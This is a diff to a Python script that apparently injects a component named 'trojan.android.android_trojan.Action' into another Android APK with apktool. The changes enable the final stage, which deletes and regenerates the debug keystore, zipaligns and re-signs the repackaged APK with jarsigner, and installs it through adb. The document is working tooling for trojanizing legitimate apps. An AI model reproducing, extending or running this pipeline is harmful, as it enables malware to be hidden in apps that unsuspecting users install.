@@ -11,7 +11,7 @@ import glob
 
 
 apktool = "/home/hoodlums/apktool/apktool"
-TempDirectory = '/tmp/'
+TempDirectory = '/tmp/MixApk/'
 
 packageToInject = 'trojan.android.android_trojan.Action'
 
@@ -170,6 +170,8 @@ def sed(file, old, new):
         print(line.replace(old, new))
 
 
+if not os.path.exists(TempDirectory):
+    os.makedirs(TempDirectory)
 
 args = ParseArgs().getargs()
 
@@ -215,12 +217,21 @@ try:
     call(apktool + " b -d -f " + apk2Directory, shell=True)
 except OSError as ex:
     error("can't build " + apk2Directory , str(ex), 1)
-'''
+
+
 try:
-    call('rm ' + apk2Dist + 'app2.apk', shell=True)
-    call('rm ~/.android/debug.keystore', shell=True)
-    call('~/android/sdk/build-tools/21.1.1/zipalign -v 4 ' + apk2DistApk + ' ' + apk2Dist + 'app2.apk', shell=True)
+    os.chdir(apk2Dist)
+    if os.path.exists(apk2Dist + 'app-debug2.apk'):
+        os.remove(apk2Dist + 'app-debug2.apk')
+    if os.path.exists(apk2Dist + 'app-debug.apk'):
+        os.remove(apk2Dist + 'app-debug.apk')
+    if os.path.exists(os.path.expanduser('~') + '/.android/debug.keystore'):
+        os.remove(os.path.expanduser('~') + '/.android/debug.keystore')
+    shutil.copyfile(apk2DistApk, apk2Dist + 'app-debug.apk')
+    call('~/android/sdk/build-tools/21.1.1/zipalign -v 4 app-debug.apk app-debug2.apk', shell=True)
     call('keytool -genkey -v -keystore ~/.android/debug.keystore -alias sample -keyalg RSA -keysize 2048 -validity 20000', shell=True)
+    call('jarsigner -verbose -keystore ~/.android/debug.keystore app-debug2.apk sample', shell=True)
+    call('jarsigner -verify app-debug2.apk', shell=True)
+    call('~/android/sdk/platform-tools/adb install app-debug2.apk', shell=True)
 except OSError as ex:
     error("can't build " + apk2Directory , str(ex), 1)
-'''
